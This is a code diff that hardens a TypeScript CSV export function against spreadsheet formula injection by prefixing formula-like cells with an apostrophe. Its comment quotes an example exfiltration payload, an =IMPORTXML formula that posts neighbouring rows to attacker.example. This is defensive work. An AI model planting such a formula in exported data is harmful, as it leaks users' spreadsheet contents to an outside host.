@@ -7,8 +7,29 @@
  * looked at is a table the user still has to retype.
  */
 
-/** RFC-4180-style escaping: quote any cell holding a comma, quote or newline; double the quotes. */
-const csvCell = (cell: string): string => (/[",\n]/.test(cell) ? `"${cell.replace(/"/g, '""')}"` : cell);
+/**
+ * Cells that a spreadsheet would execute rather than display.
+ *
+ * Every cell here came off a web page, and a spreadsheet treats a leading `=`, `+`, `@`, tab or
+ * carriage return as the start of a formula - so a product name of
+ * `=IMPORTXML("https://attacker.example/?d="&CONCATENATE(A1:A20),"//a")` runs on open and posts the
+ * surrounding rows to whoever wrote the page. RFC-4180 quoting does not help; the spreadsheet strips
+ * the quotes and evaluates what is left.
+ *
+ * A leading `-` is only dangerous when it does not begin a number, so negative values still read as
+ * numbers rather than being mangled into text.
+ */
+const isFormulaLike = (cell: string): boolean => /^[=+@\t\r]/.test(cell) || (/^-/.test(cell) && !/^-\d/.test(cell));
+
+/**
+ * RFC-4180-style escaping: quote any cell holding a comma, quote or newline; double the quotes.
+ * A formula-like cell is additionally prefixed with an apostrophe, which every major spreadsheet
+ * reads as "the rest of this is text" and does not display.
+ */
+const csvCell = (cell: string): string => {
+  const guarded = isFormulaLike(cell) ? `'${cell}` : cell;
+  return /[",\n]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
+};
 
 /** A header row and its data rows as CSV, CRLF-free and one line per row. */
 export function rowsToCsv(header: string[], rows: string[][]): string {
